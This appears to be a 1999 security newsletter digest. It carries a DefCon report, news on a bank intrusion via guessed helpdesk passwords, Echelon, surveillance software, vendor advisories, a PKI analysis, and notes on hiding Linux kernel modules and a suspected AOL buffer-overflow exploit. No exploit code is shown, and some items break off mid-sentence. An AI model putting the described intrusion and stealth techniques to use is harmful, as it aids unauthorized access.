      networksùcritics say it can also take over other peopleÆs computers over the Internet if someone were to be duped into installing it onto their
      system. BO2K has the ability to take over the mouse and keyboard of a victimÆs computer, and in addition to logging everything a person might
      type, it can provide a video feed in real time, so one can watch what the victimÆs computer is doing, what is being clicked on, and what is being seen.
      Similar to last yearÆs presentation (when the group announced their original Back Orifice tool), this year the cDc made a grand entrance with strobe
      lights, loud techno music and spinning cow skulls on the walls. It was standing room only for their almost two-hour presentation.
      
                                             Another highlight, and always a favorite, was Capture the Flag. Now, this is not the game
                                             you played when you were a kid, this is Capture the Flag, hacker-style. People set up
                                             target boxes and put them on a network in one of the convention rooms, while other
                                             people hook up their laptops and try to break into them to plant their groupÆs "flag."
                                             These boxes vary in types and operating systems, and they are not your run of the mill
                                             systems, either. The owners secure them and try to make it a difficult task for people to
                                             get on. This year, a group calling itself the "Ghetto Hacker" took first prize by getting
                                             onto the most boxes and defending them from other groups who were hard at work trying
      to follow them.
      
      As you can no doubt imagine, as much play as serious work goes on at this con, which is why people say that is it so popular. The parties go on
      long into the night, and the speakers do not start until noon or so, then fade into the games, which last until midnight or longer. The Alexis Park was
      kind enough to stock Jolt Cola for the con-goers to help keep them going, and the Dis.Org Crew (the DOC) brewed, and then gave away case after
      case of caffeinated beer to also help keep the parties going strong.
      
      Now, you may be getting the idea that DefCon is nothing more then a three-day long party, but thatÆs only part of it. The convention features
      speakers on a variety of topics: this year, there were federal agents talking about legal matters and what the government is planning on doing for the
      future of the Internet; lawyers talking about rights and how they relate to the Internet; people talking about various security problems with different
      systems and software; investigators talking about online forensics and intruder-detection systems; reporters talking about what it is like reporting
      on the hacking underground, and much, much more. 
      
      In the past, DefCon was looked on as a freak show of sorts, where people with multiple body piercing and colored hair were the norm. Now, as it
      grows, it almost looks as if this year that was the exception rather then the rule. More women are showing up, as well as people from all ethnic
      backgrounds, and more people are in their late 20s now (like me), rather then the pale youngsters of past conventions. The only thing that has
      remained from the days of yore is the party attitude.
      
      As you can imagine, not everything goes according to plan when you get over 3000
      people with a lot of technical skills and a lot of beer in one place. The lights and climate
      controls were messed with more than once, and the radio channels the hotel security used
      had to be changed several times as well because their channels were being taken over by
      short wave radios that many people were carrying on their belts. Other classic pranks
      were pulled as well: soap was poured into the hotel fountain, beer bottles were left
      floating in the pool, and streakers ran through the con from time to time (men and women).
      After the first day, the hotel had to double its security, but as with most hotels that have
      hosted DefCon in the past, it was not ready for what came with the con. On Saturday,
      some poor couple got married and had their reception at the Alexis Hotel; they were
      surrounded by freaky people con-goers and left shortly after their party arrived.
      
      The conÆs organizer, Jeff Moss (who goes by the name Dark Tangent), was strangely absent this year for most of the con. In past years, Moss was
      almost omnipresent, constantly up on stage with announcements and fixing problems that arise during the three-day con. In his absence, a large
      fellow name Priest ran the con, and run it he did, with an iron hand. He was a cross between a Nazi SS trooper and a pro wrestler, throwing people
      out on a whim and canceling presentations by people he didnÆt like. If there was anything that could have made a fun three days turn bad, he was it.
      Lucky for us con-goers, Moss would pop in from time to time and defuse things, which kept the con moving with only a few bumps.
      
      The whole idea behind DefCon is to make a place where people can meet their friends and enemies, people they may only know online; where people
      can learn and exchange ideas; where anyone can come and get a look inside the hacker underground and see that itÆs not some dark, scary place
      some reporters make it out to be, but rather a preview of the movers and shakers of the next century. These people are not trying to take over the
      Internet, they are just trying to improve it and keep companies honest in their work and what they release.
      
      Who knows, maybe if weÆd had a DefCon 20 years ago, we would not be facing the Y2K problem now, because after all, the Internet is going to be
      around for a long time, and these people who spend a large amount of their time online want nothing more than to see it improved.

     DeCursor.com reports today that the hacker ReDaTtAcK, who only a few days ago
     hacked the Belgian ISP Skynet, yesterday successfully intruded the
     computersystems of the Generale Bank, the biggest bank in Belgium. Making use of
     the banks' remote banking program and by guessing the helpdesk accounts' login
     (helpdesk) and password (hlpdsk) he was able to bruteforce the user accounts on the
     system and in doing so he claims to have access to account info, transactions and
     login codes. The bank says it won't press charges and might even ask the hacker for

     THIEVES in Newcastle are using the Internet to buy goods, charging
     them to other people's credit cards. 
  
     The scam has been used to buy property including $500 worth of
     computer software and theatre tickets. 
  
     Detectives have established how the thieves operates but are unsure
     how they are obtaining details of other people's credit cards. 
  
     "We are puzzled how he is finding out details of these people's
     accounts," Detective Senior Constable Wayne Moulton said. 
  
     "A lot of these victims have never used the Internet to buy anything
     so there is no reason why their credit details would be accessible." 
  
     Police said card numbers and names had been checked before the
     goods were dispatched, but were found to be valid and were

     U.S.-British Cyber-Spy System Puts European Countries on Edge
     By GARY CHAPMAN
     
     
     OVERETO, Italy--It felt like there was a new Cold War developing at a
     conference here last week on computers, networks and international
     security, only this time the adversaries are the United States and Europe
     and the field of conflict is cyberspace.
     
     
     The revelation last year about the collaborative electronic eavesdropping
     system developed by the U.S. National Security Agency and British
     intelligence agencies, a system known as Echelon, has become a huge topic
     of discussion in Europe.
     
     
     The Echelon system can and does intercept "all e-mail, telephone and fax
     communications" in Europe, according to a report delivered last year to
     the European Parliament, and further investigations revealed that this
     capability also covers Australia, New Zealand and other countries.
     
     
     The report's author, Steve Wright, director of Omega Foundation, a
     British human rights group, was here last week and summarized his
     investigation into Echelon.
     
     
     "The Echelon system forms part of the U.K.-U.S.A. system but unlike many
     of the electronic spy systems developed during the Cold War, Echelon is
     designed for primarily nonmilitary targets: governments, organizations and
     businesses in virtually every country," states Wright's report, "An
     Appraisal of Technologies of Political Control,"  (available on the Web at
     http://cryptome.org/stoa-atpc.htm).
     
     
     The report was prepared for the European Parliament's Scientific and
     Technological Options Assessment (STOA) group. Its release in early 1998
     shocked European government leaders.

59.0 Watching the digital detectives.

     Life / Technology


     SURVEILLANCE: Watching the digital detectives 
     Software that analyses video tape has brought total surveillance a step closer,
     says Alan Stewart

                      The recent film Enemy of the State contains a chilling
                      account of what might happen when the security
                      services turn on an innocent man, unwittingly involved
                      in their affairs.

                      The film centres on an attempt to introduce a new law
                      allowing the US government access to the video
                      footage from surveillance cameras in shopping malls,
                      petrol stations and street corners. It soon becomes
     clear, however, that the security services are already using video from those
     sources.

     Now, in the real world, a new software technology that can analyse and index
     video is being introduced by Cable News Network (CNN) to help it keep its
     competitive edge. Of obvious interest to television news companies, this
     video-searching capability is also being used by security services on both
     sides of the Atlantic.

     "We take the incoming video signal, whether it's off a tape or satellite dish,
     and extract what we call 'metadata' or index data," says Paul Lego, chief
     executive of Virage, one of the suppliers of video search software (see
     accompanying story). "We like to say we watch, read, and listen to the
     video."

     By 'watching' it, the software examines the frames of the video as they are
     read in, and when the picture changes sufficiently, a time-stamped 'key-frame'
     is stored in a database as metadata. If the video contains text (either teletext
     or close-captioning), this is 'read' and also time-stamped.

     The search software also 'listens' to the video, using an International Business
     Machines speech-to-text system which identifies speakers from a library of
     voices. "We can also, to a large degree, understand what they're saying - at
     least, at the key-word level," explains Mr Lego. Transcription is not yet
     perfect, but an accuracy of between 30 per cent (outdoors) and 90 per cent (in
     a studio) is possible.

     Users can search the database of metadata via the internet, by keying in the
     name of a person and a topic. "You might get back five video clips," says Mr
     Lego. "You can click on any of those and the software will cue to the point
     where that subject is being talked about."

     Mr Lego believes there is a huge government market for video analysis
     software, with about a third of Virage's business already being for US
     government agencies such as the FBI, CIA, Nasa, National Security Agency,
     National Image Mapping Agency, and Joint Combat Camera Command.

     The US Army and Air Force both use software from Islip Media, a rival video
     analysis company whose other users include the Department of Energy's
     Lawrence Livermore National Laboratory, and the National Institute of
     Standards and Technology.

     "The government watches every TV station in the world, looking for key
     events," says Mr Lego, who likens it to a huge TV network for every channel in
     the world, with an added requirement to analyse and translate languages. "In
     addition, there's a lot of stuff they watch that isn't what you would call
     broadcast television," he adds.

     The UK counterparts of the US security agencies are also using the same
     software to enable transatlantic trading of data.

     For the past few months, meanwhile, CNN has been testing a new system
     using Virage video analysis software, and this is now going into live operation.
     Twenty four hours a day, seven days a week, CNN's 1,500 editors receive 32
     newsfeeds, which used to be recorded on to video tapes. Now the feeds are
     recorded digitally, together with the associated script and news data, so
     editors have access to them from their desktop.

     Other US TV networks are already using video analysis systems (CBS with
     IBM's DB2 Digital Library, and NBC with Islip's MediaSite). European
     broadcasters including the BBC and Carlton in the UK and Spain's Telecinco
     and Network Espa±a have expressed interest or are running pilot schemes.
     Beyond news analysis, other TV uses of the software are digitising and
     indexing archives, adapting news for the web, and tracking newscasts of rival
     TV networks (being piloted in the US by Fox News and TimeWarner).

     Mark Juliano, Islip's chief executive, says internet-based searchable television
     is now a technical reality, with real-time searchable TV around the corner.
     "This would allow any wired home or business user to search for topics of
     interest on all channels currently broadcasting, as well as in stored
     programming," he says.

     Outside the TV industry, investment banks such as Goldman Sachs, Merrill
     Lynch and Morgan Stanley are testing the software for monitoring any mention
     of specific companies on financial news networks. The Harvard Business
     School has digitised its study material, which students can search using
     video analysis. General Motors is using the software to simplify searching
     through several hundred hours of digitised focus group sessions.

     The internet has fundamentally changed the model of searchable video,
     according to John Zappa, Islip's vice-president of marketing. "Previously, video
     cataloging, search and retrieval tools were aimed at a select group of media
     companies," says Mr Zappa. "Now, any company can easily put their video
     content on the internet."

     The introduction of video analysis and indexing technology can certainly bring
     benefits for business and consumer. But new technologies can have their
     drawbacks too. The snooping scenario envisaged by Enemy of the State may
     simply be a little late in its arrival.




     Software that's got it taped

     Virage's VideoLogger software is able to index video automatically and
     simultaneously, to digitise multiple video formats, and output information to
     any video application or database.

     The latest version supports plug-in video analysis engines for real-time facial
     and optical character recognition.

     VideoLogger works with the company's AudioLogger real-time speech
     recognition and speaker identification software. US-based Virage recently
     demonstrated a consumer version of VideoLogger, which the company claims
     will unlock the content of streaming video files on the internet.

     International Business Machines has developed a News Archive system using
     its DB2 Digital Library database technology. The Digital Library is used by
     some of the world's largest media collections, such as the US Library of
     Congress, the Vatican Library in Rome, the State Hermitage Museum in St
     Petersburg, Russia, and the National Palace Museum in Taiwan.

     The News Archive system lets users search video clips via precoded
     parameters, such as clip date, subject name, producer, and location, or carry
     out free-text searches of text notes and scripts. IBM's "query by image
     content" allows a search for clips according to their shape and colour.

     A spin-off from Carnegie-Mellon University in Pittsburgh, Pennsylvania, Islip
     (Integrated Speech, Language, and Image Processed) Media has licensed the
     technology base and software of the university's Informedia Digital Library
     project. Islip's MediaSite system consists of several modules, including
     creation and search tools.

     Islip's MediaSite.net web site is a clearing-house for stock footage, news and
     information, training and education video content, which users can search and
     pay for via the web. Virage has recently launched a similar service, Virage
     Interactive, as a hosted index of searchable video.

     Excalibur Technologies' text searching software is used by many
     organisations, including the two leading political parties in the UK.

     The company, also US-based, has recently introduced its Excalibur
     Screening Room video analysis system, and has teamed up with StorageTek,
     the disc storage company, to provide large digital video repositories.

60.0 Microsoft acknowledges software glitch that exposes e-mail  passwords
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     Microsoft acknowledges software glitch that exposes e-mail  passwords
     
     
     WASHINGTON (August 19, 1999 10:00 p.m. EDT http://www.nandotimes.com)
     Microsoft Corp. said Thursday a bug in its new Internet chat software that
     permits coworkers and others to see a person's e-mail password.  It
     promised to fix it by week's end.
     
     
     The glitch in the company's new "MSN Messenger" software means that others
     who have access to a person's computer could impersonate that person to
     read and even send e-mail using his "Hotmail" account without anyone's
     knowledge.
     
     
     Microsoft said that even if customers delete their saved password and
     enter it manually, it still becomes visible if another person types a
     specific sequence of keystrokes on that computer.
     
     
     Microsoft, whose software runs most of the world's personal computers,
     promised to fix the problem by the end of Friday. The company said it was
     made aware of the bug earlier this week.
     
     
     Deanna Sanford, the product manager for MSN, said the bug's ill effects
     were mitigated because a person must have physical access to the victim's
     computer, meaning the problem will be worse in offices where coworkers
     share machines than for home users.
     
     
     "In a shared office environment, if you trust the people you work with,
     this will probably never be an issue," Sanford said. But she said
     Microsoft recommends protecting each computer with a password.
     
     
     The problem was the latest embarrassment for Microsoft over its attempt to
     capture part of the burgeoning market for Internet chat software,
     currently dominated by America Online Inc.'s "Instant Messenger" software.
     
     
     When Microsoft unveiled its chat software earlier this month, AOL
     complained that Microsoft engineers had hacked into its proprietary
     network to let MSN customers communicate with AOL's customers.
     
     
     AOL successfully blocked Microsoft's software several times, but with each
     attempt Microsoft redesigned its chat software to bypass AOL's blocking
     attempts.
     
     
     MSN Messenger customers currently can chat with people using AOL's
     software, and Microsoft - in a bid for the moral high ground - announced
     earlier this week it will release its software protocols so that other
     companies can design software that interoperates with MSN.
     
     
     The latest Microsoft bug occurs when customers use the software to check
     their e-mail using Microsoft's popular Web-based "Hotmail"  service. If a
     person stops the resulting Internet page from loading and looks at the
     underlying software code - which requires merely three clicks with the
     mouse - the user's e-mail name and password are displayed in plain view.
     
     
     Sanford said Microsoft will scramble the information in the upcoming
     patched version using encryption technology.

61.0 U.S to seek new computer surveillance power

     U.S. To Seek Neew Computer Surveillance Power
     
     
     http://dailynews.yahoo.com/h/nm/19990820/ts/technology_covert_2.html
     
     
     WASHINGTON (Reuters) [8.20.99] - The Justice Department is seeking new
     powers to break into private premises and disable security precautions on
     personal computers as a prelude to a wiretap or further search, the
     Washington Post reported Friday.
     
     
     The department wanted to make it easier for law enforcement authorities to
     get search warrants that would let them monitor suspects' computerized
     records after break-ins, said the paper, citing documents and interviews
     with Clinton administration officials.
     
     
     ``In a request set to go to Capitol Hill, Justice officials will ask
     lawmakers to authorize covert action in response to the growing use of
     software programs that encrypt, or scramble, computer files,'' the report
     said. Such encryption makes computers inaccessible to anyone who lacks a
     special code or ''key.''
     
     
     Justice officials worry that such software ``is increasingly used as a
     means to facilitate criminal activity, such as drug trafficking,
     terrorism, white-collar crime and the distribution of child pornography,''
     the Post quoted an Aug. 4 memo by the department as saying.
     
     
     Under the proposed ``Cyberspace Electronic Security Act,'' investigators
     armed with a sealed warrant could comb computers for passwords and install
     devices that override encryption programs, the Post reported, citing the
     Justice memo.
     
     
     To pull information from a targeted computer, agents would still be
     required to get additional authorization from a court, the paper said.
     
     
     Justice officials were not immediately available for comment. The proposal
     is the latest in a years-long tug-of-war between the government and
     computer users who want to protect their privacy by encrypting documents.

62.0 Code cracker worries cryptographers

     Code Cracker Worries Cryptographers
     
     
     August 13, 1999
     
     
     WORCESTER, MASS. - The Associated Press via NewsEdge Corporation : A
     developer of one of the most widespread computer encryption systems said
     Thursday he has designed a computer that could crack open a file encoded
     using the most common form of data encryption in only a few days.
     
     
     If built _ at an estimated cost of about $2 million _ such a computer
     could jeopardize the privacy of the bulk of electronic commerce as
     practiced today, according to cryptographers at the conference where the
     design was shown.
     
     
     Most highly sensitive military, banking and other data are protected by
     stronger encryption keys beyond its reach. The commonly used weaker keys,
     though, would become ``easy to break for large organizations,'' said
     cryptographer Adi Shamir of the Weizmann Institute of Science in Rehovot,
     Israel.
     
     
     He developed both the new computer design and helped invent the widespread
     coding system _ known as RSA public-key encryption _ that it attacks.
     
     
     Shamir spoke at the opening of a two-day conference of more than 120
     cryptography experts from around the world at Worcester Polytechnic
     Institute.
     
     
     Computer scientists said his work underscores the growing vulnerability of
     the most commonly used short form of RSA keys, which consists of just 512
     bits. The key _ a sequence of 1s and 0s, or bits _ unlocks the secret
     coding of a computer transmission so it can be deciphered.
     
     
     Shamir dubs his idea for the computer Twinkle, which stands for The
     Weizmann Institute Key Locating Engine and also refers to the twinkle of
     its light emitting diodes. The 6-by-6-inch optical computer would measure
     the light from diodes to perform mathematical calculations solving 512-bit
     RSA encryption keys faster than ever _ within two or three days. An effort
     in February to solve shorter, easier 465-bit keys took hundreds of
     computers and several months.

64.0 PKI yesterday today and tomorrow
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     PKI: Yesterday, Today, Tomorrow


    A Hurwitz Group Exclusive Analysis

    By Diana Kelley
    August 23, 1999 - For the past three years or so the rallying cry from the
    major PKI vendors has been, "This is the year of PKI!" While it's true that PKI has
    made some significant inroads into organizations, most notably ScotiaBank in
    Canada and the ANX PKI created by the US automobile industry, we are still some
    distance from the "Year of PKI." In practice many companies have spent time and
    effort prototyping PK-Islands, independent disconnected solutions that fail to
    support true business to business applications. Frustrated by investments in time
    and money with little visible return many organizations have temporarily halted PKI
    work. What's caused this slowdown in adoption and is there a change in the
    landscape that signals a new phase for PKI?

     What is it?


    PKI. It's a great buzzword, but what is it exactly? A large part of the confusion in the industry can be directly
    correlated to a muddied perception of what PKI is and what it can do for business. PKI is shorthand for Public Key
    Infrastucture. It is based on the concept of public key cryptography which uses a key pair, a public key and a private
    key, to perform various cryptographic functions. 
    Public key cryptography differs from the more traditional symmetric key which uses the same keys for encryption and
    decryption. Symmetric key cryptography is fast and efficient but has a major drawback, it requires that the parties find
    a way to share the single key secretly in advance of the communication session. In a closed environment this is not a
    difficult accomplishment, but when two parties are meeting for the first time in a public digital environment such as the
    Internet it is almost impossible to arrange a convenient manner to exchange a secret key. By splitting up the
    cryptographic functions between a public and a private key, public key cryptography enables parties that have never
    met before to communicate in an encrypted manner.

    How the Keys are Used

    Security services provided by public keys include authentication and non-repudiation though the use of digital
    signatures, and confidentiality of communication in transit. The public and private keys are linked mathematically but
    one should not be capable of being derived from the other. If the private key could be derived from the public key it
    would break the security of the system. In practice, the public key is available to the public, it can be sent on request
    by the owner or stored in a central server. The private key should be kept secret by the owner, either on the holder's
    hard drive or a device such as a smartcard.

    Encrypted Communications

    Public key cryptography can be used to encrypt a communication before sending it over untrusted networks, such as
    the Internet. The sender encrypts the message using the recipient's public key. Depending on the distribution method
    the sender could request the public key directly from the intended recipient, or look up the public key in an available
    key repository. Upon receipt the recipient uses her private key to decrypt the data. Data that has been encrypted
    using a public key can only be decrypted using the related private key. This technique can be extended to data that is
    resides on hard drives as well to provide secure storage.

    Digital Signatures

    The other most common use of public key cryptogrpahy is to provide authentication and nonrepudiation using digital
    signatures. A signature is created by creating a hash of the data and then encrypting this with the sender's private
    key. The recipient performs the same hash function on the data to create a value. Using the sender's public key, the
    recipient decrypts the digital signature to discover the sender's hash value of the message. If the two values match,
    the recipient knows conclusively that the message has not been tampered with and that it was sent by someone in
    possession of the sender's private key.

    Components of PKI

    The PKI itself is the set of protocols and systems used to manage and distribute the keys and certificates. There is no
    single definition of what constitutes a PKI, although many organizations including the IETF (Internet Engineerng Task
    Force), The Open Group, and NIST (National Institute of Standards and Technology) are working on various PKI related
    standards. In general, most PKIs include a standard set of components as listed below.
    Registration Authority (RA) - The trusted entity that certifies the identity of the user 
    Certification Authority (CA) - The trusted entity that issues public key certificates 
    Certificate Repository - The server or system where public key certificates are held
    Certificates - The records that contain structured information about the owner including the owner's name, public key
    and the name of the issuing authority. The current standard for public key certifcates is X.509v3. 
    Certificate Revocation Lists (CRLs) - The listing of revoked or suspended public key certificates.

     What Happened?


    After looking at public key cryptography a lot of companies thought, "Wow, this is really neat technology!" And they
    were right. But even the most sophisticated technology in the world is of no use unless it can be applied directly to
    the solution of a business/consumer problem. In the mad frenzy to become an Internet enabled e-Business many
    companies rushed towards implementation of PKI without first taking the time to define their business requirements.
    Without a clear business goal to build toward even the best technology in the world will fail to be successful. 

    Business Need vs. Media Hype

    What, then are the business needs? Any organization that is planning to transform to an e-Business needs to answer
    the following questions:
       What is the business problem? 
       What are the available technologies to solve the problem? 
       What fits in best with our environment? 
    Specific requirements vary depending on the line of business, unique needs of the business units, and market-based
    needs driven by industry. Within this spectrum, there are some basic e-Business needs that cut across most industries.
    These include:
       Availability to the global market for 24x7x365 selling and support 
       Rapid deployment to keep pace with the competition 
       Enhanced customer experience achieved using personalization technologies 
       Increased control over the supply chain to reduce inventory turn time 
       Privacy of communications 
       Non-repudiability of transactions 
    That's quite a long list and no single technology can provide answers to each one. Smart e-Businesses must select the
    most appropriate technologies to solve each problem. In the case of PKI, it is extemely well suited to provide solutions
    for the last two bullets, but does not directly provide an answer to the other e-Business issues.

    Reality Sets In

    When the media hype surrounding PKI broke hit the marketplace a few years ago there was a lot of misrepresentation
    and promise surrounding what PKI could actually do. The combination of a mixed media message and a lack of defined
    goals within business is one of the main reasons that many companies were disappointed with their early
    implementations of PKI technology.
    Creating a distributed, scalable PKI is not an easy task. This complexity has given rise to a number of factors that
    have contributed to failed or stalled PKI implementations.

    Lack of Interoperability

    If companies don't want to find themselves stranded on their own PK-Island they need to plan to integrate with other
    installations. This is easier said than done. X.509 certificates are not always interoperable and many of the PKI vendors
    can not provide cross-certification and certificate validation cross-vendor.

    Cost

    A lack of standards exists in pricing schemes as well. Some vendors charge per certificate, others per number of users,
    and others still by number of servers. The result is a confusing tangle, when it is finally sorted out most companies find
    that the cost of the PKI will be much higher than originally expected.

    Legacy Applications that aren't PK-enabled

    Public key technology is great but it needs to be linked directly into an application to add business value. Legacy
    systems and ERP applications are not enabled for PKI. Packaged application vendors are beginning to build in support
    for PKI, but until now the only way to integrate certificates into the back office has been through an investment in
    developer time and resources.

    Scalability Issues

    Because PKI is in its infancy there have not been a number of large distributed installations. Scalability of the CRLs
    (Certificate Revocation Lists) is a concern for organizations that will deal with large numbers of revoked certificates.
    Scalability and performance concerns include excessive time delays, high processing loads and need for additional
    bandwidth. 

    Not Customer Centric

    Private keys are pieces of code that need to be stored someplace. One of the biggest benefits to e-Business is the
    ease of access and mobility. Using any available web browser people can check stock prices, read and write email, and
    bank on-line from a variety of locations and systems. If a certificate is required for access then user mobility is limited
    to the system where the certificate is stored. Smartcards are a possible solution to this dilemma but they are still too
    limiting; the free Internet terminal at the airport doesn't have a smartcard reader, does it?

    What Next?

    If PKI implementations have been so difficult to deploy successfully up to now, what has changed that makes it right
    for today's e-Business. One need look no further than ScotiaBank and the ANX PKI for answes. Both of these
    implementations were well thought out implementations of PKI to solve a specific business problem. The abilities to
    encrypt transactions between parties and provide non-repudiation services to consumers are cornerstones of
    e-Business. 
    Already there have been some very successful uses for PKI in VPN implementations and for email. In the future as the
    transformation to the e-Business paradigm progresses, the boundaries between internal and external networks will
    disappear. In this newly open and interconnected world PKI has the opportunity to provide targeted business solutions
    in a number of areas. As communications between applications and devices increase, look for and increase in
    certificates that are issued to devices such as routers and firewalls to manage secure communications. Using the time
    stamping feature contained in some PKIs, organizations can protect auditing and logging data and store it encrypted.
    For high security sites, content could be protected on a page by page basis. And with the ascendence of Directory
    Services in the enterprise organizations are discovering a central repository with a shared query language (LDAP) that
    can be used to store and distribute certificates.
    PKI has an imporant place in the future of e-Business. The trick is for companies to establish the business problem that
    needs to be solved first and then match the PKI solution appropriately. When companies address a business need with
    the right technology everybody wins.

65.0 Microsoft Advisory, double byte code page vulnerability
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     The following is a Security  Bulletin from the Microsoft Product Security
     Notification Service.
     
     
     Please do not  reply to this message,  as it was sent  from an unattended
     mailbox.
                         ********************************
     
     
     Re-release of Patch for "Double Byte Code Page" Vulnerability
     -------------------------------------------------------------
     
     
     August 20, 1999
     
     
     Issue
     =====
     Microsoft has identifed and corrected a regression error in the IIS 4.0
     version of the previously-released patch for the "Double Byte Code Page"
     vulnerability.  The corrected patch has been re-released, and an updated
     security bulletin is available at
     http://www.microsoft.com/security/bulletins/ms99-022.asp.
     
     
     Details
     =======
     Shortly after releasing the patch for the "Malformed HTTP Request Header"
     vulnerability (http://www.microsoft.com/Security/Bulletins/ms99-029.asp),
     Microsoft discovered a regression error in it.  We investigated all
     previously-released patches to determine whether any others were affected by
     the error, and discovered that one other patch was affected -- the IIS 4.0
     version of the patch for the "Double Byte Code Page" vulnerability. On
     August 16, 1999, we re-released the patch for the "Malformed HTTP Request
     Header" vulnerability, and today are re-releasing the patch for the "Double
     Byte Code Page" vulnerability.  We have verified that no other security
     patches are affected by this vulnerability, and have corrected our code base
     to eliminate the error from all future IIS 4.0 releases.
     
     
     The regression error is completely unrelated to the vulnerabilities, and
     does not change our diagnosis of either.  The error occurs if the IIS log
     file grows to a size that is an exact multiple of 64KB; if this happens, the
     server will hang.  The problem can be resolved by stopping the IIS service,
     starting a new log file, and restarting the IIS service.  The regression
     error affected only IIS 4.0, and was introduced after Windows NT 4.0 Service
     Pack 5.
     
     
     How to Identify the Re-released Patches
     =======================================
     - The re-released patches for the "Double Byte Code Page" are
        timestamped August 17, 1999.  (Please note that the IIS 3.0 patches
        were unaffected by the regression error, so they are still
        timestamped June 24, 1999).
     - The re-released patches for the "Malformed HTTP Request Header"
        are timestamped August 12, 1999.
     
     
     What Customers Should Do
     ========================
     You do not need to take any action if ANY of the following apply to you:
     - You are running IIS 3.0.
     - You have not installed any IIS 4.0 patches released after
        Windows NT 4.0 Service Pack 5.
     - You have installed the re-released patch for the "Malformed HTTP
        Request Header" vulnerability.
     
     
     You need to take action if ALL of the following apply to you:
     - You applied the original version of either the "Double Byte Code Page"
        patch or the "Malformed HTTP Request Header" patch.
     - You have not applied the re-released version of either patch.
     
     
     If you need to take action, you should apply the re-released patches for
     either the "Maformed HTTP Request Header" or "Double Byte Code Page"
     vulnerabilities.  Applying either of the patches will correct the error.
     It's not necessary to "back out" either of the original patches; just
     download the new version of either patch and install it.
     
     
     Obtaining Support on this Issue
     ===============================
     This is a fully supported patch. Information on contacting Microsoft
     Technical Support is available at
     http://support.microsoft.com/support/contact/default.asp.

     hi,
     
     
     don't think that hiding modules is an old topic. ;-)
     since all the other dirty tricks didn't work on 2.2
     kernel (as using asm-code etc.) i used new
     techniqe to hide modules. example-code below.
     payload is simly print-out-message-at-execution-call
     thingie.
     this module even is stealth enuff ;-) for my radar.c
     module-detector.
     any other suggestions are welcome.
     
     
     cheers,
     Stealth

     7. Problem description:
     
     
     A buffer overflow existed in libtermcap's tgetent() function,
     which could cause the user to execute arbitrary code if they
     were able to supply their own termcap file.
     
     
     Under Red Hat Linux 5.2 and 4.2, this could lead to local users
     gaining root privileges, as xterm (as well as other possibly
     setuid programs) are linked against libtermcap. Under Red Hat
     Linux 6.0, xterm is not setuid root.
     
     
     Thanks go to Kevin Vajk and the Linux Security Audit team for
     noting and providing a fix for this vulnerability.
     
     
     8. Solution:
     
     
     For each RPM for your particular architecture, run:
     
     
     rpm -Uvh &lt;filename>
     
     
     where filename is the name of the RPM.
     
     
     9. Verification:
     
     
     MD5 sum                           Package Name

69.0 Possible AOL IM buffer overflow
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     /*
     Possible Buffer Overflow in AOL Instant Messenger
     ------------------------------------------------------------
     Robert Graham
     http://www.robertgraham.com/pubs/aol-exploit/
     
     
     
     It appears to me that AOL might be running a buffer-overflow
     exploit against their own clients.
     
     
     
     BEFORE DOING ANYTHING ELSE: log onto AOL Instant Messaging and
     take a trace of it with NetMon/tcpdump/Sniffer/etc. If this is
     really happening, then AOL will likely fix it soon.
     
     
     
     DETAILS
     ------------------------------------------------------------
     
     
     Last friday I read the following in the NYTimes:
     http://www.nytimes.com/library/tech/99/08/biztech/articles/13soft.html
     
     
     This story brings up the implication that America Online might
     be running a "buffer-overflow exploit" on in its own users.
     They have already made 13 changes to their server code in
     the past few weeks in order to stop Microsoft's clones from
     working, so this may be yet another attempt.
     
     
     According to whay I see, it appears to me that this implication
     is correct. I see something that looks a lot like a buffer overflow
     exploit when sniffing the connection between the client and AOL's servers.
     
     
     You can reproduce this yourself:
     
     
     1. log onto AOL Instant Messenger with the latest client that
        comes with Communicator version WIN32 2.0.912, aka 2.0N.
        (Click on [File/Help/Report a bug] to get the real version).
     
     
     2. take a packet trace of the login procedures (I use NetMon).
     
     
     3. look for the frame that I describe below.
     
     
     4. copy/paste the frame data into the C program as I demonstrate
        below.
     
     
     5. step through the code in the debugger and disassemble it
     
     
     
     THE PACKET
     ------------------------------------------------------------
     
     
     AOL has removed their documentation from the Internet recently.
     I had to download the GAIM (AIM client for Linux) source
     code to figure things out.
     
     
     A TCP connection is used. The format for each request/response
     in the login process is:
     
     
     byte[0] = 0x2a
     byte[1] = 0x02 (type = 2 =login)
     byte[2-3] = sequence number
     byte[4-5] = length
     byte[6-7] = type
     byte[8-9] = subtype
     
     
     However, multiple requests/responses can be queued into
     a single packet. Following is the entire TCP packet I received
     from the AOL server to my client:

     There are three AIM segments in this packet, which I've
     marked with slashes in the above decode. (Remember that
     TCP is a stream based protocol, so application protocols
     have to figure out their own boundaries, and you often
     see multiple segments in a single TCP packet). The
     second segment is of interest here, as marked by
     the slashes.
     
     
     It seems like the first byte of the embedded code
     starts at the byte with the value 0x83 at offset 0x53
     However, this isn't the buffer overflow, but the start of the
     buffer itself. Immediately proceeding this is what appears to
     be a length field. I'm thinking they only allow for a max
     length of 256 (0x100), but the length field has an
     extra 0x18 bytes. So if we go 256 bytes into the buffer,
     we get some more stuff that looks like code.
     
     
     I haven't analyzed all this stuff, but it appears that at
     the end of the overflow section, it jumps back to the start
     of the buffer that contains the code of the exploit.
     [You only get so much wriggle room where you overflow,
     because the more you overflow, the more of the stack you
     overwrite; so the overflowed section has to be as small
     as possible, and jump backwards to actually run something].
     
     
     
     THE DECODE
     ------------------------------------------------------------
     
     
     In this section, I have done a decode of all the bytes
     in the segment. To the left are the original bytes,
     to the right is either the protocol interpretation
     or the disassembled output. These bytes are
     in the same order as in the original packet.

     You'll notice that there appears to be other code that
     I haven't disassembled. I would have to second-guess
     the original source, and I don't quite feel like it.
     
     
     How to disassemble this? The easiest way is simply
     to paste the data bytes into a program and RUN the code.
     
     
     In theory, you could create a sample program that would
     actually run this code completely without crashing
     but that would take A LOT of effort.

     --[begin]--
                               L0pht Security Advisory     
     
     
                Release date: August 11, 1999
                  Vulnerable: Microsoft Windows95a (w/winsock2), Windows95b
               Windows98, Windows98se and Sun Microsystems
               SunOS & Solaris operating systems.
                    Severity: Attackers can remotely add default route entries
               on the victims host.
                  Status: Microsoft contacted, fix provided.
                      Author: sili@l0pht.com
